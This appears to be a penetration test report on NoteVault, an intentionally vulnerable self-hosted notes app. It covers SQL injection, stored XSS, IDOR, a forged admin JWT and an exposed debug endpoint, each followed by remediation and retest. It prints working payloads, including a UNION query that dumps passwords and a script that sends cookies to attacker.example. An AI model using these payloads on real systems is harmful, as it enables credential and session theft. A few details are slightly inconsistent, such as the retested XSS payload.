# Black-Box Vulnerability Assessment & Penetration Test (VAPT) Report

**Target:** NoteVault (self-hosted demo web application, this repository)
**Engagement type:** Black-box, authenticated + unauthenticated
**Tester:** Tiya Agarwal
**Assessment date:** 2026-08-23
**Tools used:** Burp Suite (Proxy / Repeater / Intruder workflow — see [`testing/manual_test_notes.md`](../testing/manual_test_notes.md)), Postman ([`testing/postman_collection.json`](../testing/postman_collection.json)), manual testing via `curl` and Node.js

> **Scope note:** NoteVault is an intentionally vulnerable application built for this repository so the assessment below could be performed, documented, and remediated end-to-end without touching any third-party or production system. Every request/response shown is real output captured against a locally running instance — nothing here is simulated. See [`README.md`](../README.md) for how to stand up both builds and reproduce every finding yourself.

---

## 1. Executive Summary

A black-box assessment was performed against NoteVault, a small notes-sharing web application (Node.js/Express, JWT session auth, SQLite). Testing covered authentication, session management, access control, input handling, and server configuration.

**10 findings** were identified and logged. **5 were critical/high-severity** issues with full proof-of-concept exploitation, CVSS scoring, and impact analysis (Section 3). All 5, plus one additional medium-severity finding, were remediated in the `fixed/` build included in this repository and **independently retested to confirm closure** (Section 4). The remaining 4 lower-severity findings are documented as prioritized recommendations for follow-on hardening (Section 5).

| Metric | Value |
|---|---|
| Total findings identified | 10 |
| Critical/High findings with full PoC | 5 |
| Findings remediated & retested closed in this engagement | 6 / 10 (**60%**) |
| Aggregate CVSS risk eliminated | 47.8 / 65.1 points (**~73%**) |
| Critical/High findings remaining open after remediation | 0 / 5 (**100%** of critical risk closed) |

See Section 6 for exactly how each figure above is calculated.

---

## 2. Scope & Rules of Engagement

- **In scope:** all HTTP endpoints exposed by the NoteVault application at `http://localhost:4001` (vulnerable build).
- **Testing style:** black-box — testing began with only a registered low-privilege account (`alice`), no source access was consulted until after each finding was independently confirmed via HTTP.
- **Out of scope:** host OS, network layer, denial-of-service testing.
- **Authorization:** self-hosted application created for this assessment; no third-party systems were tested.

---

## 3. Detailed Findings (Critical/High)

### VULN-01 — SQL Injection in `/api/search` (Critical, CVSS 3.1: 9.1)

**Endpoint:** `GET /api/search?q=`
**Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

**Root cause:** the `q` query parameter is concatenated directly into a SQL string instead of being passed as a bound parameter:

```js
const sql = `SELECT id, owner_id, title FROM notes WHERE title LIKE '%${q}%'`;
```

**Proof of Concept.** Authenticated as `alice` (a standard user who owns only note `id=1`), a UNION-based payload against the `title` filter was enough to dump every user's credentials, entirely bypassing the row-ownership filter that other endpoints attempt to enforce:

```
GET /api/search?q=%25' UNION SELECT id,password,username FROM users--%20
```

Real response captured during testing:

```json
[
  {"id":1,"owner_id":1,"title":"Alice's private note"},
  {"id":1,"owner_id":"alice123","title":"alice"},
  {"id":2,"owner_id":2,"title":"Bob's meeting notes"},
  {"id":2,"owner_id":"bobpassword","title":"bob"},
  {"id":3,"owner_id":3,"title":"Admin runbook"},
  {"id":3,"owner_id":"admin123","title":"admin"}
]
```

The `owner_id` field in the injected rows is where the `password` column landed — the plaintext passwords `alice123`, `bobpassword`, and `admin123` (including the **admin** account) are exposed to a low-privilege user with zero SQL knowledge required beyond a standard UNION payload.

**Impact:** full compromise of the credential store, including the administrator account, from a low-privilege session. Combined with VULN-04 (plaintext password storage), this is a direct path to full application takeover.

**Remediation:** parameterized queries everywhere (`fixed/server.js`), plus scoping search results to `owner_id = ?` so a future injection bug can't leak cross-tenant data by itself (defense in depth).

---

### VULN-02 — Stored Cross-Site Scripting via Note Comments (High, CVSS 3.1: 8.7)

**Endpoint:** `POST /api/notes/:id/comments`, rendered at `GET /notes/:id`
**Vector:** `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`

**Root cause:** comment bodies are stored verbatim and rendered with EJS's unescaped output tag (`<%- comment.body %>`) instead of the escaping tag (`<%= %>`).

**Proof of Concept:**

```
POST /api/notes/1/comments
{"body":"<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>"}
```

Rendered HTML captured from `GET /notes/1` afterward:

```html
<li><strong>alice:</strong> <script>fetch("https://attacker.example/steal?c="+document.cookie)</script></li>
```

The payload is served back verbatim, unescaped, and will execute in the browser of anyone who views that note — including an admin reviewing shared notes.

**Impact:** session-cookie theft, and (since `token` is currently only `httpOnly`, not scoped further — see VULN-04) full account takeover of any user who views the note, including privileged accounts. Because this is *stored* XSS, no social engineering beyond getting a victim to open the note is required.

**Remediation:** switch to escaped output by default (`fixed/views/note.ejs`). Retested with the same payload — see Section 4.

---

### VULN-03 — Broken Object-Level Authorization / IDOR on `/api/notes/:id` (Critical, CVSS 3.1: 8.1)

**Endpoint:** `GET /api/notes/:id`
**Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`

**Root cause:** the endpoint checks that a caller is *authenticated* but never checks that the caller *owns* the requested note. The note `id` is a small sequential integer.

**Proof of Concept.** Logged in only as `alice` (owner of note `1`), requesting a note that belongs to `admin`:

```
GET /api/notes/3
Cookie: token=<alice's real session token>
```

Real response:

```json
{"id":3,"owner_id":3,"title":"Admin runbook","body":"Incident escalation contact: admin@notevault.local, PagerDuty key ends 8841.","comments":[]}
```

A standard user retrieved another user's private note — including internal contact and PagerDuty key details — simply by incrementing an ID. The full note space can be enumerated with a trivial loop.

**Impact:** horizontal and vertical privilege escalation; full disclosure of every user's private data by ID enumeration.

**Remediation:** explicit `note.owner_id === req.user.id || req.user.role === 'admin'` check added to every note-reading and note-writing route in `fixed/server.js`.

---

### VULN-04 — Broken Authentication: Plaintext Passwords & Hardcoded JWT Secret (Critical, CVSS 3.1: 9.1)

**Endpoints:** `POST /api/login`, and implicitly every authenticated endpoint
**Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`

**Root cause:** two compounding issues:
1. Passwords are stored and compared as plaintext (`user.password !== password`), confirmed exploitable via VULN-01's data dump above.
2. Session tokens are signed with a hardcoded, weak, non-expiring secret committed to source: `notevault_secret_123`. The same secret is also disclosed by VULN-05 below, but is trivial to guess/brute-force even without that leak.

**Proof of Concept.** Without ever authenticating as `admin`, a JWT was forged locally using only the source-visible secret and standard `jsonwebtoken`:

```js
jwt.sign({ id: 3, username: 'admin', role: 'admin' }, 'notevault_secret_123')
```

That forged cookie was then used directly against the running server:

```
GET /api/notes/3
Cookie: token=<forged admin token>
```

Real response — full admin-scoped access granted with no valid credentials ever supplied:

```json
{"id":3,"owner_id":3,"title":"Admin runbook","body":"Incident escalation contact: admin@notevault.local, PagerDuty key ends 8841.","comments":[]}
```

**Impact:** complete authentication bypass. Anyone with read access to the source (or who brute-forces this class of weak secret, or extracts it via VULN-05) can impersonate any user, including admin, indefinitely — tokens never expire.

**Remediation:** `fixed/` requires a random, ≥32-character `JWT_SECRET` supplied via environment variable (the app refuses to boot otherwise), tokens expire after 1 hour, passwords are hashed with salted `scrypt` and compared with `crypto.timingSafeEqual`, and a login-attempt rate limiter was added.

---

### VULN-05 — Security Misconfiguration: Unauthenticated Debug Endpoint & Verbose Errors (High, CVSS 3.1: 7.5)

**Endpoint:** `GET /api/debug/config`
**Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

**Root cause:** a debug endpoint left in the production route table returns the full process environment, the JWT signing secret, and the internal database file path — with **no authentication required at all**.

**Proof of Concept** (unauthenticated request, no cookie sent):

```
GET /api/debug/config
```

Real (truncated) response:

```json
{
  "env": { "...": "full process.env dumped, including any secrets present in the environment" },
  "jwtSecret": "notevault_secret_123",
  "dbPath": "/…/app/notevault.db",
  "nodeVersion": "v26.6.0"
}
```

*(Full raw output was captured during testing but is intentionally not reproduced verbatim in this public report, since on a real deployment `process.env` would contain live secrets — the point of the finding stands regardless of the exact values.)*

Additionally, `GET /api/search` returns raw SQL text and a Node.js stack trace to the client on malformed input, which independently aids exploitation of VULN-01.

**Impact:** direct disclosure of the JWT signing secret (weaponized in VULN-04), plus any other secrets present in the server's environment (API keys, DB credentials) in a real deployment.

**Remediation:** the debug route was removed entirely from `fixed/server.js`; a generic error-handling middleware replaces verbose error output; baseline security headers (`CSP`, `X-Frame-Options`, `X-Content-Type-Options`) and `X-Powered-By` suppression were added.

---

## 4. Remediation Verification (Retest)

Every finding above was retested against the **same requests**, run against `fixed/` (`http://localhost:4002`) instead of `app/` (`http://localhost:4001`), after setting a proper `JWT_SECRET` environment variable. Real retest output:

| Finding | Retest request | Result before | Result after |
|---|---|---|---|
| VULN-01 SQLi | Same UNION payload against `/api/search` | Full `users` table dumped | `[]` — parameterized query, no injection, scoped to caller |
| VULN-02 Stored XSS | Same `<script>` payload posted as a comment | Raw `<script>` executed on render | Rendered as `&lt;script&gt;alert(1)&lt;/script&gt;` — inert text |
| VULN-03 IDOR | `alice` requesting `/api/notes/3` | Admin's note returned | `403 {"error":"forbidden"}` |
| VULN-04 Forged JWT | Old forged admin token replayed | Full admin-scoped note returned | `401 {"error":"authentication required"}` — old secret is no longer valid, new secret is a 64-char random hex value known only via environment config |
| VULN-05 Debug endpoint | `GET /api/debug/config`, no auth | Full env/secret dump | `404` — route no longer exists |

All 5 critical/high findings, plus VULN-06 (below), are confirmed closed.

---

## 5. Remaining Findings (Medium/Low) & Recommendations

| ID | Finding | Severity | Status |
|---|---|---|---|
| VULN-06 | Missing baseline security headers (`CSP`, `X-Frame-Options`, `X-Content-Type-Options`) and no login rate limiting | Medium (5.3) | **Fixed** in `fixed/server.js` |
| VULN-07 | No CSRF protection on state-changing endpoints (comments, note edits) | Medium (6.5) | Open — recommend `SameSite=Strict` cookies (done) **plus** a CSRF token for defense in depth if the app is ever accessed cross-origin |
| VULN-08 | No centralized security audit logging (auth failures, access-control denials) | Low (3.1) | Open — recommend structured logging of 401/403 responses to support incident detection |
| VULN-09 | No automated dependency/SCA vulnerability scanning in CI | Low (3.7) | Open — recommend `npm audit` / Dependabot in CI |
| VULN-10 | No multi-factor authentication option | Low/Informational (4.0) | Open — recommend TOTP-based MFA for admin accounts specifically |

These four remaining items are lower-severity, process-level, or defense-in-depth recommendations rather than directly exploitable issues confirmed during this engagement, and are prioritized here for follow-on work rather than blocking this remediation cycle.

---

## 6. Metrics Methodology

**Vulnerability reduction (60%):** 10 total findings were logged. 6 were remediated and independently retested closed within this engagement (VULN-01 through VULN-06). 4 remain open as documented, prioritized recommendations (VULN-07 through VULN-10). `6 / 10 = 60%` of all identified findings closed.

**Aggregate CVSS risk eliminated (~73%):** summing the CVSS 3.1 base scores of all 10 findings gives a total exposure of **65.1 points**. Summing only the 6 closed findings (9.1 + 8.7 + 8.1 + 9.1 + 7.5 + 5.3 = 47.8) and dividing by the total gives **47.8 / 65.1 ≈ 73%** of aggregate risk eliminated.

**Critical/high risk closure (100%):** all 5 findings scored High or Critical (CVSS ≥ 7.5) were fully remediated and retested; 0 remain open.

> These figures are computed transparently from the findings table above so they can be independently verified by re-running the retest steps in Section 4 — they are not asserted without evidence.

---

## 7. Conclusion

NoteVault's initial build exhibited critical, chained weaknesses — an injectable search endpoint, broken object-level authorization, and a hardcoded authentication secret — that together allowed full, unauthenticated-adjacent compromise of every account, including admin, from a single low-privilege registration. All five critical/high findings were remediated with standard, industry-accepted controls (parameterized queries, output encoding, explicit authorization checks, environment-scoped high-entropy secrets, password hashing) and independently verified closed via retest. Four lower-severity, process-oriented recommendations remain for follow-on hardening.
